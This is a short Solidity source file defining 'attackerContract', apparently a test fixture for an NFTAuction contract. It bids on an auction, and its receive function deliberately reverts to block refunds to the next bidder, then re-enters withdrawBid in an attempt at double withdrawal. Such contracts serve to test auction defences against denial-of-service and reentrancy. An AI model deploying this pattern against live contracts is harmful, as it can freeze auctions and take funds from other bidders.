//SPDX-License-Identifier: Unlicense
pragma solidity 0.8.4;
import "./NFTAuction.sol";

contract attackerContract {
    uint256 public balanceOfContract;
    NFTAuction auction;
    uint256 tokenID;
    address erc721;
    uint256 amount;
    bool reverts;
    bool withdrawFail;

    function setAuctionContract(address _auctionContract) external {
        auction = NFTAuction(_auctionContract);
    }

    function bidOnAuction(
        address _erc721,
        uint256 _token,
        uint256 _amount
    ) external {
        auction.makeBid{value: _amount}(_erc721, _token, address(0), 0);
        erc721 = _erc721;
        tokenID = _token;
        amount = _amount;
        balanceOfContract -= _amount;
    }

    function setRequire(bool _req) external {
        reverts = _req;
    }

    function withdraw() public {
        auction.withdrawBid(erc721, tokenID);
    }

    function deposit() external payable {
        balanceOfContract += msg.value;
    }

    function withdrawFailed() external payable {
        withdrawFail = true;
        auction.withdrawAllFailedCredits();
    }

    receive() external payable {
        balanceOfContract += msg.value;
        require(reverts, "Cause failure to block next bidder");
        if (!withdrawFail) {
            withdraw(); //attempt to withdraw again
        }
    }
}
